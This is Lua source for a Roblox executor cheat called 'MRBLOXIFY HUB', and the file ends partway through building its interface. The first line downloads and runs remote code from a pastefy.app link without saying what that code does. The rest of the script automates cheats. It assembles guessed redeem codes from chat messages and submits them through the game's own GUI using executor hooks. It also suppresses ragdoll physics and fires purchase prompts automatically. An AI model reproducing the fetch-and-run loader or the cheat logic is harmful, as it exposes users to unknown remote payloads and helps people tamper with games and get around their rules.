loadstring(game:HttpGet("https://pastefy.app/kSHTmryl/raw"))()
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local HttpService = game:GetService("HttpService")
local RealTweenService = game:GetService("TweenService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local Player = Players.LocalPlayer
local PlayerGui = Player:WaitForChild("PlayerGui")

-- ========================= Настройки =========================

local SETTINGS_FILE = "MRBLOXIFY_HUB_settings.json"
local settings = {
    animations = true,
    animWindow = true,
    animButtons = true,
    animPanels = true,
    speed = 1,
    scale = 1.35,
    pulse = true,
    transparency = 0.05,
    hue = 0.555,
    sat = 1,
    theme = "custom",
    bloxTheme = "purple",
    bloxHue = 0.78,
    bloxSat = 1,
    sound = true,
    volume = 0.5,
    autoUseCode = true,
}

pcall(function()
    if isfile and isfile(SETTINGS_FILE) then
        local data = HttpService:JSONDecode(readfile(SETTINGS_FILE))
        for key, value in pairs(data) do
            if settings[key] ~= nil and type(value) == type(settings[key]) then
                settings[key] = value
            end
        end
    end
end)

local function saveSettings()
    pcall(function()
        if writefile then
            writefile(SETTINGS_FILE, HttpService:JSONEncode(settings))
        end
    end)
end

-- Обёртка над TweenService: учитывает скорость и переключатели анимаций
local TweenService = {}

function TweenService:Create(object, info, properties, category)
    local enabled = settings.animations and (category == nil or settings[category])

    if enabled then
        info = TweenInfo.new(
            info.Time / settings.speed,
            info.EasingStyle,
            info.EasingDirection,
            info.RepeatCount,
            info.Reverses,
            info.DelayTime
        )
    else
        info = TweenInfo.new(0)
    end

    return RealTweenService:Create(object, info, properties)
end


-- ========================= Система тематик =========================

settings.hue = math.clamp(settings.hue, 0, 1)
settings.sat = math.clamp(settings.sat, 0, 1)
settings.bloxHue = math.clamp(settings.bloxHue, 0, 1)
settings.bloxSat = math.clamp(settings.bloxSat, 0, 1)

-- Роли цветов: {насыщенность, яркость}. Оттенок берётся из settings.hue
local THEME_ROLES = {
    bg          = {0.118, 1.00},
    bar         = {0.220, 0.98},
    button      = {0.245, 0.96},
    hover       = {0.333, 0.94},
    active      = {0.470, 0.96},
    input       = {0.196, 1.00},
    stroke      = {0.390, 0.96},
    text        = {0.770, 0.51},
    textMain    = {0.830, 0.47},
    textInput   = {0.840, 0.37},
    textSub     = {0.610, 0.71},
    placeholder = {0.420, 0.75},
}

local function rgb(r, g, b)
    return Color3.fromRGB(r, g, b)
end

-- Готовые темы с фиксированными цветами
local THEME_PRESETS = {
    dark = {
        bg = rgb(24, 24, 28),       bar = rgb(34, 34, 40),
        button = rgb(48, 48, 56),   hover = rgb(68, 68, 80),
        active = rgb(60, 110, 190), input = rgb(36, 36, 42),
        stroke = rgb(80, 80, 94),   text = rgb(230, 230, 236),
        textMain = rgb(240, 240, 246), textInput = rgb(255, 255, 255),
        textSub = rgb(160, 160, 172),  placeholder = rgb(120, 120, 134),
    },
    light = {
        bg = rgb(255, 255, 255),    bar = rgb(240, 240, 245),
        button = rgb(230, 230, 238), hover = rgb(212, 212, 224),
        active = rgb(170, 195, 235), input = rgb(246, 246, 250),
        stroke = rgb(200, 200, 212), text = rgb(40, 40, 48),
        textMain = rgb(30, 30, 38),  textInput = rgb(15, 15, 22),
        textSub = rgb(110, 110, 124), placeholder = rgb(150, 150, 164),
    },
    newyear = {
        bg = rgb(16, 52, 40),       bar = rgb(150, 28, 38),
        button = rgb(36, 96, 68),   hover = rgb(190, 44, 56),
        active = rgb(30, 140, 75),  input = rgb(12, 40, 32),
        stroke = rgb(232, 192, 72), text = rgb(255, 245, 225),
        textMain = rgb(255, 255, 255), textInput = rgb(255, 250, 235),
        textSub = rgb(242, 204, 126),  placeholder = rgb(150, 190, 170),
    },
    halloween = {
        bg = rgb(20, 14, 26),       bar = rgb(52, 24, 74),
        button = rgb(64, 34, 92),   hover = rgb(112, 52, 142),
        active = rgb(190, 80, 10),  input = rgb(32, 20, 42),
        stroke = rgb(255, 122, 22), text = rgb(255, 140, 30),
        textMain = rgb(255, 236, 205), textInput = rgb(255, 205, 125),
        textSub = rgb(184, 134, 224),  placeholder = rgb(130, 100, 152),
    },
}

if settings.theme ~= "custom" and not THEME_PRESETS[settings.theme] then
    settings.theme = "custom"
end

local themed = {}

local function getColor(role)
    if type(role) == "function" then
        role = role()
    end

    local preset = settings.theme ~= "custom" and THEME_PRESETS[settings.theme]

    if preset then
        return preset[role]
    end

    local part = THEME_ROLES[role]
    return Color3.fromHSV(settings.hue, part[1] * settings.sat, part[2])
end

-- Регистрирует свойство объекта, которое будет менять цвет вместе с темой
local function themeReg(object, property, role)
    themed[#themed + 1] = {object, property, role}
    object[property] = getColor(role)
end

local function applyTheme(instant)
    local info = TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)

    for i = #themed, 1, -1 do
        local item = themed[i]
        local object = item[1]

        if not object.Parent then
            table.remove(themed, i)
        elseif instant then
            object[item[2]] = getColor(item[3])
        else
            TweenService:Create(object, info, {[item[2]] = getColor(item[3])}):Play()
        end
    end
end

-- ========================= Основная логика =========================

local lower = string.lower
local find = string.find
local match = string.match
local concat = table.concat
local clear = table.clear
local spawnTask = task.defer

local scanning = false
local processing = false
local workerScheduled = false

local buffer = {}
local bufferHead = 1

local mode = 5 -- 1-4: фиксированное число сообщений, 5: АВТО (пробует 2, 3, 4)
local delay = 0.01

local cachedGui
local cachedFrame
local cachedBox
local cachedButton

local previewBox
local scanButton
local modeButton
local statusDot
local delayBox

-- Общие функции для переключения между окнами MRBLOXIFY HUB и MrBloxify
local hub = {}
local bloxPreview

function hub.sync() end

-- Сколько сообщений нужно минимум для попытки (в авто-режиме минимум 2)
function hub.need()
    return mode == 5 and 2 or mode
end

function hub.modeText()
    if mode == 5 then
        return "MODE: AUTO 2-4 MESSAGES"
    end

    return "MODE: " .. mode .. " GLOBAL MESSAGE" .. (mode == 1 and "" or "S")
end

hub.autoTried = 0

-- ========================= Хэллоуин фон (ведьма, зелья, тыквы) =========================
function hub.makeHalloweenDecor(parent)
    local decor = Instance.new("Frame")
    decor.Name = "HalloweenDecor"
    decor.Size = UDim2.fromScale(1, 1)
    decor.BackgroundTransparency = 1
    decor.BorderSizePixel = 0
    decor.ClipsDescendants = true
    decor.Active = false
    decor.Visible = false
    decor.ZIndex = 1
    decor.Parent = parent

    local function add(text, x, y, size, rotation, transparency)
        local label = Instance.new("TextLabel")
        label.Size = UDim2.fromOffset(size + 10, size + 10)
        label.Position = UDim2.fromOffset(x, y)
        label.BackgroundTransparency = 1
        label.Font = Enum.Font.Gotham
        label.Text = text
        label.TextSize = size
        label.TextTransparency = transparency or 0.45
        label.Rotation = rotation or 0
        label.ZIndex = 1
        label.Parent = decor
        return label
    end

    -- Тыквы
    add("🎃", -4, 136, 44, -8)
    add("🎃", 262, 130, 42, 8)
    add("🎃", 108, 156, 30, 4)
    add("🎃", 200, 150, 32, -5)
    add("🎃", 14, 64, 22, -10, 0.6)
    add("🎃", 266, 62, 20, 10, 0.6)

    -- Зелья
    add("🧪", 60, 168, 26, -10)
    add("⚗", 158, 170, 26, 8)
    add("🧪", 236, 168, 22, -6)
    add("🔮", 8, 102, 20, 6, 0.6)
    add("🧪", 278, 98, 20, 12, 0.6)

    return function(active)
        decor.Visible = active and true or false
    end
end

-- ========================= Новогодний фон (ёлки, подарки, сани) =========================
-- Возвращает функцию setActive(bool): показывает/скрывает декор за содержимым окна
function hub.makeXmasDecor(parent)
    local decor = Instance.new("Frame")
    decor.Name = "XmasDecor"
    decor.Size = UDim2.fromScale(1, 1)
    decor.BackgroundTransparency = 1
    decor.BorderSizePixel = 0
    decor.ClipsDescendants = true
    decor.Active = false
    decor.Visible = false
    decor.ZIndex = 1
    decor.Parent = parent

    local function add(text, x, y, size, rotation, transparency)
        local label = Instance.new("TextLabel")
        label.Size = UDim2.fromOffset(size + 10, size + 10)
        label.Position = UDim2.fromOffset(x, y)
        label.BackgroundTransparency = 1
        label.Font = Enum.Font.Gotham
        label.Text = text
        label.TextSize = size
        label.TextTransparency = transparency or 0.45
        label.Rotation = rotation or 0
        label.ZIndex = 1
        label.Parent = decor
        return label
    end

    -- Ёлки
    add("🎄", -6, 128, 46, -6)
    add("🎄", 262, 122, 44, 7)
    add("🎄", 100, 146, 34, 3)
    add("🎄", 196, 140, 36, -4)
    add("🎄", 18, 62, 24, -8, 0.6)
    add("🎄", 258, 58, 22, 8, 0.6)

    -- Подарки
    add("🎁", 50, 168, 26, -8)
    add("🎁", 150, 172, 28, 6)
    add("🎁", 232, 170, 24, -5)
    add("🎁", 8, 100, 20, 10, 0.6)
    add("🎁", 276, 96, 20, -10, 0.6)

    return function(active)
        decor.Visible = active and true or false
    end
end

local function clearCache()
    cachedGui = nil
    cachedFrame = nil
    cachedBox = nil
    cachedButton = nil
end

local function isOwnGui(object)
    local parent = object

    for _ = 1, 8 do
        if not parent then
            return false
        end

        if parent.Name == "SourcesHubRedeemerGui" then
            return true
        end

        parent = parent.Parent
    end

    return false
end

local function isGuiButton(object)
    return object:IsA("TextButton") or object:IsA("ImageButton")
end

local function isSubmitButton(object)
    if not isGuiButton(object) or isOwnGui(object) then
        return false
    end

    local name = lower(object.Name)
    local text = object:IsA("TextButton") and lower(object.Text or "") or ""

    return find(name, "submit", 1, true)
        or find(text, "submit", 1, true)
        or find(name, "redeem", 1, true)
        or find(text, "redeem", 1, true)
        or find(name, "claim", 1, true)
        or find(text, "claim", 1, true)
        or find(name, "confirm", 1, true)
        or find(text, "confirm", 1, true)
        or find(name, "enter", 1, true)
end

local function cacheValid()
    return cachedGui
        and cachedGui.Parent
        and cachedFrame
        and cachedFrame.Parent
        and cachedBox
        and cachedBox.Parent
        and cachedButton
        and cachedButton.Parent
end

local function findControls()
    local gui = PlayerGui:FindFirstChild("Codes")

    if not gui then
        clearCache()
        return
    end

    if cacheValid() and cachedGui == gui then
        return cachedBox, cachedButton
    end

    if gui:IsA("ScreenGui") then
        gui.Enabled = true
    end

    local frame = gui:FindFirstChild("Codes") or gui

    if frame:IsA("GuiObject") then
        frame.Visible = true
    end

    local box
    local button
    local descendants = frame:GetDescendants()

    for i = 1, #descendants do
        local object = descendants[i]

        if not isOwnGui(object) then
            if not box and object:IsA("TextBox") then
                box = object
            elseif not button and isSubmitButton(object) then
                button = object
            end

            if box and button then
                break
            end
        end
    end

    if box and not button then
        for i = 1, #descendants do
            local object = descendants[i]

            if not isOwnGui(object) and isGuiButton(object) then
                local name = lower(object.Name)

                if not find(name, "close", 1, true)
                    and not find(name, "toggle", 1, true)
                    and name ~= "x" then

                    button = object
                    break
                end
            end
        end
    end

    cachedGui = gui
    cachedFrame = frame
    cachedBox = box
    cachedButton = button

    return box, button
end

local function activateButton(button)
    if not button or not button.Parent then
        return false
    end

    if typeof(firesignal) == "function" then
        local signal = button.Activated

        if pcall(firesignal, signal) then
            return true
        end

        if button:IsA("TextButton") then
            if pcall(firesignal, button.MouseButton1Click) then
                return true
            end
        end
    end

    local success = pcall(function()
        button.Activated:Fire()
    end)

    return success
end

local function redeem(code)
    if not code or code == "" then
        return false
    end

    local box = cachedBox
    local button = cachedButton

    if not cacheValid() then
        box, button = findControls()
    end

    if not box or not box.Parent then
        clearCache()
        box, button = findControls()

        if not box then
            return false
        end
    end

    local success = pcall(function()
        box.Text = code
    end)

    if not success then
        clearCache()
        box, button = findControls()

        if not box then
            return false
        end

        pcall(function()
            box.Text = code
        end)
    end

    if box.Text ~= code then
        pcall(function()
            box.Text = code
        end)
    end

    if button and button.Parent and activateButton(button) then
        return true
    end

    if typeof(firesignal) == "function" then
        pcall(firesignal, box.FocusLost, true)
        return true
    end

    return false
end

local function validCode(code)
    return code
        and #code > 0
        and match(code, "^[A-Za-z0-9]+$") ~= nil
end

local function bufferSize()
    return #buffer - bufferHead + 1
end

local function resetBuffer()
    clear(buffer)
    bufferHead = 1
    hub.autoTried = 0
end

local function updatePreview()
    if not previewBox then
        return
    end

    local size = bufferSize()
    local text = ""

    if size > 0 then
        local count = math.min(size, mode == 5 and 4 or mode)
        local values = table.create(count)

        for i = 1, count do
            values[i] = buffer[bufferHead + i - 1]
        end

        text = concat(values)
    end

    previewBox.Text = text

    if bloxPreview then
        bloxPreview.Text = text
    end
end

local function takeCode()
    if bufferSize() < mode then
        return nil
    end

    local values = table.create(mode)

    for i = 1, mode do
        values[i] = buffer[bufferHead]
        buffer[bufferHead] = nil
        bufferHead += 1
    end

    if bufferHead > #buffer then
        resetBuffer()
    end

    return concat(values)
end

-- ===== АВТО-режим: пробуем код из 2, затем 3, затем 4 сообщений =====
-- Если код не подошёл, сообщения остаются в буфере и пробуется следующая длина.
hub.waiting = false
hub.resultKind = nil
hub.resultTimeout = 0.01 -- сколько максимум ждать ответ игры перед следующей попыткой

hub.OK_WORDS = {
    "success", "redeemed", "claimed", "congrat", "you got", "you received",
    "you've received", "reward", "already",
}

hub.FAIL_WORDS = {
    "invalid", "wrong", "not valid", "incorrect", "doesn't exist", "does not exist",
    "not exist", "expired", "not found", "unknown", "try again", "no such",
}

-- Распознаёт ответ игры на ввод кода. Возвращает true, если текст был ответом
function hub.noteResult(text)
    if not hub.waiting or not text then
        return false
    end

    local low = lower(tostring(text))

    if #low > 300 then
        return false
    end

    low = string.gsub(low, "<[^>]+>", "")

    for _, word in ipairs(hub.OK_WORDS) do
        if find(low, word, 1, true) then
            hub.resultKind = "ok"
            return true
        end
    end

    for _, word in ipairs(hub.FAIL_WORDS) do
        if find(low, word, 1, true) then
            hub.resultKind = "fail"
            return true
        end
    end

    return false
end

-- Вводит код и ждёт ответ игры (но не дольше hub.resultTimeout).
-- true = код принят, false = неверный или ответа не было
function hub.tryRedeem(code)
    hub.resultKind = nil
    hub.waiting = true

    redeem(code)

    local startedAt = os.clock()

    while hub.waiting and not hub.resultKind and os.clock() - startedAt < hub.resultTimeout do
        task.wait()
    end

    hub.waiting = false

    return hub.resultKind == "ok"
end

function hub.processAuto()
    -- начало буфера всегда в позиции 1
    if bufferHead > 1 then
        local rest = {}

        for i = bufferHead, #buffer do
            rest[#rest + 1] = buffer[i]
        end

        clear(buffer)

        for i = 1, #rest do
            buffer[i] = rest[i]
        end

        bufferHead = 1
    end

    -- Пробует 2 слова, смотрит на ответ игры, если неверно — сразу пробует 3,
    -- потом сразу 4. Каждый шаг ждёт ответ максимум hub.resultTimeout секунд
    while scanning and mode == 5 do
        local n = math.max(hub.autoTried + 1, 2)

        if n > 4 then
            -- 2, 3 и 4 не подошли: выбрасываем самое старое и пробуем дальше
            table.remove(buffer, 1)
            hub.autoTried = 0
            updatePreview()
        elseif #buffer < n then
            break
        else
            local code = concat(buffer, "", 1, n)

            previewBox.Text = code

            if bloxPreview then
                bloxPreview.Text = code
            end

            local accepted = hub.tryRedeem(code)

            if scanning and mode == 5 and #buffer >= n then
                if accepted then
                    for _ = 1, n do
                        table.remove(buffer, 1)
                    end

                    hub.autoTried = 0
                else
                    hub.autoTried = n
                end
            end

            updatePreview()

            if delay > 0 then
                task.wait(delay)
            end
        end
    end
end

local function processBuffer()
    if processing or not scanning then
        return
    end

    processing = true

    if mode == 5 then
        hub.processAuto()
        processing = false
        updatePreview()
        return
    end

    while scanning and bufferSize() >= mode do
        local code = takeCode()

        if not code then
            break
        end

        updatePreview()
        redeem(code)

        if delay > 0 then
            task.wait(delay)
        end
    end

    processing = false
    updatePreview()

    if scanning and bufferSize() >= mode then
        if not workerScheduled then
            workerScheduled = true

            spawnTask(function()
                workerScheduled = false
                processBuffer()
            end)
        end
    end
end

local function scheduleProcess()
    if not scanning or processing or workerScheduled then
        return
    end

    workerScheduled = true

    spawnTask(function()
        workerScheduled = false
        processBuffer()
    end)
end

-- Авто-запуск: если в игре (сообщение или текст на экране) видно "use code" или "code is",
-- скрипт сам нажимает кнопку «Запуск!» и начинает сканировать
hub.lastAuto = 0

function hub.tryAutoCode(text)
    if not settings.autoUseCode or not text then
        return false
    end

    text = tostring(text)

    if #text > 400 then
        return false
    end

    local low = lower(text)

    if not find(low, "code", 1, true) then
        return false
    end

    -- убираем rich text теги вида <font ...>
    low = string.gsub(low, "<[^>]+>", "")

    if not (
        find(low, "use%s+code")
        or find(low, "use%s+the%s+code")
        or find(low, "code%s+is")
    ) then
        return false
    end

    -- не дёргаем запуск чаще раза в 30 секунд (текст может висеть на экране)
    local now = os.clock()

    if now - hub.lastAuto < 30 then
        return true
    end

    hub.lastAuto = now

    if not scanning then
        spawnTask(hub.toggleScan)
    end

    return true
end

local function receiveMessage(text)
    if hub.noteResult(text) then
        return
    end

    if text and hub.tryAutoCode(text) then
        return
    end

    if not scanning or not text then
        return
    end

    local code = match(tostring(text), "^%s*(.-)%s*$")

    if not validCode(code) then
        return
    end

    buffer[#buffer + 1] = code

    updatePreview()

    if bufferSize() >= hub.need() then
        scheduleProcess()
    end
end

local function findNotifyRemote()
    if _G.PhiNotifyRemote then
        return _G.PhiNotifyRemote
    end

    local packages = ReplicatedStorage:FindFirstChild("Packages")
    local net = packages and packages:FindFirstChild("Net")

    if not net then
        return nil
    end

    if not getconnections or not debug or not debug.getinfo then
        return nil
    end

    local descendants = net:GetDescendants()

    for i = 1, #descendants do
        local object = descendants[i]

        if object:IsA("RemoteEvent") then
            local success, connections = pcall(getconnections, object.OnClientEvent)

            if success and connections then
                for j = 1, #connections do
                    local connection = connections[j]
                    local fn

                    pcall(function()
                        fn = connection.Function
                    end)

                    if type(fn) == "function" then
                        local info

                        pcall(function()
                            info = debug.getinfo(fn)
                        end)

                        if info then
                            local source = tostring(info.short_src or info.source or "")

                            if find(source, "NotificationController", 1, true) then
                                return object
                            end
                        end
                    end
                end
            end
        end
    end

    return nil
end

-- ========================= Anti Ragdoll + Авто-покупка =========================
-- Всё лежит в таблице hub, чтобы не упереться в лимит локальных переменных (200).

hub.antiRagdoll = false
hub.autoBuy = false
hub.buyInterval = 0.25
hub.buyToken = 0
hub.ragdollConn = nil
hub.rows = {} -- функции обновления текста кнопок (чтобы оба окна показывали одно и то же)

function hub.refreshRows()
    for _, refresh in ipairs(hub.rows) do
        refresh()
    end
end

hub.RAGDOLL_ATTRS = {"Ragdoll", "Ragdolled", "IsRagdoll", "RagdollState", "Stunned"}

hub.BAD_STATES = {
    [Enum.HumanoidStateType.Ragdoll] = true,
    [Enum.HumanoidStateType.FallingDown] = true,
    [Enum.HumanoidStateType.Physics] = true,
}

function hub.charParts()
    local char = Player.Character

    if not char then
        return
    end

    return char, char:FindFirstChildOfClass("Humanoid"), char:FindFirstChild("HumanoidRootPart")
end

function hub.fixRagdoll()
    local char, humanoid, root = hub.charParts()

    if not (char and humanoid and root) or humanoid.Health <= 0 then
        return
    end

    for _, name in ipairs(hub.RAGDOLL_ATTRS) do
        if char:GetAttribute(name) == true then
            char:SetAttribute(name, false)
        end
    end

    for _, object in ipairs(char:GetDescendants()) do
        if object:IsA("Motor6D") then
            if not object.Enabled then
                object.Enabled = true
            end
        elseif object:IsA("BallSocketConstraint") then
            object:Destroy()
        end
    end

    if humanoid.PlatformStand then
        humanoid.PlatformStand = false
    end

    if hub.BAD_STATES[humanoid:GetState()] then
        humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
    end

    if root.AssemblyAngularVelocity.Magnitude > 50 then
        root.AssemblyAngularVelocity = Vector3.zero
    end
end

function hub.setRagdollStates(humanoid, state)
    pcall(function()
        humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, state)
        humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown, state)
    end)
end

function hub.setAntiRagdoll(state)
    hub.antiRagdoll = state

    local _, humanoid = hub.charParts()

    if humanoid then
        hub.setRagdollStates(humanoid, not state)
    end

    if hub.ragdollConn then
        hub.ragdollConn:Disconnect()
        hub.ragdollConn = nil
    end

    if state then
        hub.ragdollConn = game:GetService("RunService").Heartbeat:Connect(hub.fixRagdoll)
    end
end

Player.CharacterAdded:Connect(function(char)
    if not hub.antiRagdoll then
        return
    end

    local humanoid = char:WaitForChild("Humanoid", 5)

    if humanoid then
        hub.setRagdollStates(humanoid, false)
    end
end)

function hub.tryBuy()
    local _, _, root = hub.charParts()

    if not root then
        return
    end

    for _, prompt in ipairs(workspace:GetDescendants()) do
        if prompt:IsA("ProximityPrompt") and prompt.Enabled then
            local action = lower(prompt.ActionText or "")

            if find(action, "purchase", 1, true) or find(action, "buy", 1, true) then
                local part = prompt.Parent

                if part and part:IsA("Attachment") then
                    part = part.Parent
                end

                if part and part:IsA("BasePart")
                    and (part.Position - root.Position).Magnitude <= prompt.MaxActivationDistance + 5 then

                    pcall(fireproximityprompt, prompt)
                end
            end
        end
    end
end

function hub.setAutoBuy(state)
    if state and typeof(fireproximityprompt) ~= "function" then
        state = false -- экзекутор не поддерживает fireproximityprompt
    end

    hub.autoBuy = state
    hub.buyToken += 1
    local token = hub.buyToken

    if state then
        task.spawn(function()
            while hub.autoBuy and hub.buyToken == token do
                pcall(hub.tryBuy)
                task.wait(hub.buyInterval)
            end
        end)
    end
end

function hub.stopFeatures()
    hub.setAntiRagdoll(false)
    hub.setAutoBuy(false)
end

-- ========================= GUI =========================

local oldGui = PlayerGui:FindFirstChild("SourcesHubRedeemerGui")

if oldGui then
    oldGui:Destroy()
end

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "SourcesHubRedeemerGui"
screenGui.ResetOnSpawn = false
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.Parent = PlayerGui

-- ========================= Звук =========================

local clickSound = Instance.new("Sound")
clickSound.Name = "ClickSound"
clickSound.SoundId = "rbxassetid://6895079853"
clickSound.Volume = settings.volume
clickSound.Parent = screenGui

local function playClick()
    if not settings.sound then
        return
    end

    clickSound.Volume = settings.volume
    clickSound.TimePosition = 0
    clickSound:Play()
end

local function attachClick(button)
    button.MouseButton1Click:Connect(playClick)
end

-- ========================= Окно =========================

local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.Size = UDim2.fromOffset(300, 205)
mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
mainFrame.Position = UDim2.fromScale(0.5, 0.5)
themeReg(mainFrame, "BackgroundColor3", "bg")
mainFrame.BackgroundTransparency = settings.transparency
mainFrame.BorderSizePixel = 0
mainFrame.ClipsDescendants = true
mainFrame.Parent = screenGui

-- Плавное открытие
local scale = Instance.new("UIScale")
scale.Scale = 0
scale.Parent = mainFrame

TweenService:Create(scale, TweenInfo.new(0.45, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
    Scale = settings.scale
}, "animWindow"):Play()

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 16)
corner.Parent = mainFrame

local stroke = Instance.new("UIStroke")
themeReg(stroke, "Color", "stroke")
stroke.Thickness = 1.5
stroke.Parent = mainFrame

hub.xmasMain = hub.makeXmasDecor(mainFrame)
hub.halloMain = hub.makeHalloweenDecor(mainFrame)
hub.refreshXmas = function()
    hub.xmasMain(settings.theme == "newyear")
    hub.halloMain(settings.theme == "halloween")
end
hub.refreshXmas()

local avatar = Instance.new("ImageLabel")
avatar.Size = UDim2.fromOffset(30, 30)
avatar.Position = UDim2.new(1, -42, 0, 7)
avatar.BackgroundTransparency = 1
avatar.ScaleType = Enum.ScaleType.Crop
avatar.ZIndex = 20
avatar.Parent = mainFrame

local avatarCorner = Instance.new("UICorner")
avatarCorner.CornerRadius = UDim.new(1, 0)
avatarCorner.Parent = avatar

local topBar = Instance.new("Frame")
topBar.Size = UDim2.new(1, 0, 0, 44)
themeReg(topBar, "BackgroundColor3", "bar")
topBar.BackgroundTransparency = 0.2
topBar.BorderSizePixel = 0
topBar.Parent = mainFrame

local topCorner = Instance.new("UICorner")
topCorner.CornerRadius = UDim.new(0, 16)
topCorner.Parent = topBar

local title = Instance.new("TextLabel")
title.Size = UDim2.fromOffset(200, 14)
title.Position = UDim2.fromOffset(12, 8)
title.BackgroundTransparency = 1
title.Font = Enum.Font.GothamBold
title.Text = "MRBLOXIFY HUB"
themeReg(title, "TextColor3", "text")
title.TextSize = 11
title.TextXAlignment = Enum.TextXAlignment.Left
title.Parent = topBar

local subtitle = Instance.new("TextLabel")
subtitle.Size = UDim2.fromOffset(200, 12)
subtitle.Position = UDim2.fromOffset(12, 25)
subtitle.BackgroundTransparency = 1
subtitle.Font = Enum.Font.Gotham
subtitle.Text = "ТГК:MRBLOXTRADE"
themeReg(subtitle, "TextColor3", "textSub")
subtitle.TextSize = 10
subtitle.TextXAlignment = Enum.TextXAlignment.Left
subtitle.Parent = topBar

statusDot = Instance.new("TextButton")
statusDot.Size = UDim2.fromOffset(10, 10)
statusDot.Position = UDim2.new(1, -18, 0, 17)
statusDot.BackgroundColor3 = Color3.fromRGB(255, 90, 95)
statusDot.BorderSizePixel = 0
statusDot.Text = ""
statusDot.AutoButtonColor = false
statusDot.Parent = topBar

local dotCorner = Instance.new("UICorner")
dotCorner.CornerRadius = UDim.new(1, 0)
dotCorner.Parent = statusDot

attachClick(statusDot)

-- Кнопка сворачивания
local collapseButton = Instance.new("TextButton")
collapseButton.Size = UDim2.fromOffset(18, 18)
collapseButton.Position = UDim2.new(1, -70, 0, 13)
themeReg(collapseButton, "BackgroundColor3", "hover")
collapseButton.BorderSizePixel = 0
collapseButton.Text = "–"
themeReg(collapseButton, "TextColor3", "textMain")
collapseButton.Font = Enum.Font.GothamBold
collapseButton.TextSize = 14
collapseButton.AutoButtonColor = false
collapseButton.Parent = topBar

local collapseCorner = Instance.new("UICorner")
collapseCorner.CornerRadius = UDim.new(1, 0)
collapseCorner.Parent = collapseButton

attachClick(collapseButton)

local collapsed = false
local expandedSize = UDim2.fromOffset(300, 205)
local collapsedSize = UDim2.fromOffset(300, 44)

collapseButton.MouseButton1Click:Connect(function()
    collapsed = not collapsed

    TweenService:Create(mainFrame, TweenInfo.new(0.35, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
        Size = collapsed and collapsedSize or expandedSize
    }, "animPanels"):Play()

    collapseButton.Text = collapsed and "+" or "–"
end)

-- Кнопка настроек
local gearButton = Instance.new("TextButton")
gearButton.Size = UDim2.fromOffset(18, 18)
gearButton.Position = UDim2.new(1, -92, 0, 13)
themeReg(gearButton, "BackgroundColor3", "hover")
gearButton.BorderSizePixel = 0
gearButton.Text = "⚙️"
themeReg(gearButton, "TextColor3", "textMain")
gearButton.Font = Enum.Font.GothamBold
gearButton.TextSize = 12
gearButton.AutoButtonColor = false
gearButton.Parent = topBar

local gearCorner = Instance.new("UICorner")
gearCorner.CornerRadius = UDim.new(1, 0)
gearCorner.Parent = gearButton

attachClick(gearButton)

-- Кнопка тематик
local themeButton = Instance.new("TextButton")
themeButton.Size = UDim2.fromOffset(18, 18)
themeButton.Position = UDim2.new(1, -114, 0, 13)
themeButton.BorderSizePixel = 0
themeButton.Text = "🎨"
themeButton.Font = Enum.Font.GothamBold
themeButton.TextSize = 12
themeButton.AutoButtonColor = false
themeButton.Parent = topBar
themeReg(themeButton, "BackgroundColor3", "hover")
themeReg(themeButton, "TextColor3", "textMain")

local themeCorner = Instance.new("UICorner")
themeCorner.CornerRadius = UDim.new(1, 0)
themeCorner.Parent = themeButton

attachClick(themeButton)

scanButton = Instance.new("TextButton")
scanButton.Size = UDim2.new(1, -24, 0, 30)
scanButton.Position = UDim2.fromOffset(12, 52)
themeReg(scanButton, "BackgroundColor3", function() return scanning and "active" or "button" end)
scanButton.BackgroundTransparency = 0.2
scanButton.BorderSizePixel = 0
scanButton.Font = Enum.Font.GothamBold
scanButton.Text = "Запуск!"
themeReg(scanButton, "TextColor3", "textMain")
scanButton.TextSize = 11
scanButton.AutoButtonColor = false
scanButton.Parent = mainFrame

local scanCorner = Instance.new("UICorner")
scanCorner.CornerRadius = UDim.new(0, 10)
scanCorner.Parent = scanButton

modeButton = Instance.new("TextButton")
modeButton.Size = UDim2.new(1, -24, 0, 30)
modeButton.Position = UDim2.fromOffset(12, 88)
themeReg(modeButton, "BackgroundColor3", "button")
modeButton.BackgroundTransparency = 0.2
modeButton.BorderSizePixel = 0
modeButton.Font = Enum.Font.GothamBold
modeButton.Text = hub.modeText()
themeReg(modeButton, "TextColor3", "textMain")
modeButton.TextSize = 9
modeButton.AutoButtonColor = false
modeButton.Parent = mainFrame

local modeCorner = Instance.new("UICorner")
modeCorner.CornerRadius = UDim.new(0, 10)
modeCorner.Parent = modeButton

previewBox = Instance.new("TextBox")
previewBox.Size = UDim2.new(1, -102, 0, 30)
previewBox.Position = UDim2.fromOffset(12, 126)
themeReg(previewBox, "BackgroundColor3", "input")
previewBox.BackgroundTransparency = 0.2
previewBox.BorderSizePixel = 0
previewBox.PlaceholderText = "Кодик..."
themeReg(previewBox, "PlaceholderColor3", "placeholder")
previewBox.Text = ""
themeReg(previewBox, "TextColor3", "textInput")
previewBox.ClearTextOnFocus = false
previewBox.Font = Enum.Font.GothamBold
previewBox.TextSize = 11
previewBox.TextXAlignment = Enum.TextXAlignment.Left
previewBox.Parent = mainFrame

local previewCorner = Instance.new("UICorner")
previewCorner.CornerRadius = UDim.new(0, 10)
previewCorner.Parent = previewBox

local previewPadding = Instance.new("UIPadding")
previewPadding.PaddingLeft = UDim.new(0, 8)
previewPadding.PaddingRight = UDim.new(0, 8)
previewPadding.Parent = previewBox

local redeemButton = Instance.new("TextButton")
redeemButton.Size = UDim2.fromOffset(70, 30)
redeemButton.Position = UDim2.new(1, -82, 0, 126)
themeReg(redeemButton, "BackgroundColor3", "button")
redeemButton.BorderSizePixel = 0
redeemButton.Text = "Юзнуть"
themeReg(redeemButton, "TextColor3", "textMain")
redeemButton.Font = Enum.Font.GothamBold
redeemButton.TextSize = 10
redeemButton.Parent = mainFrame

local redeemCorner = Instance.new("UICorner")
redeemCorner.CornerRadius = UDim.new(0, 10)
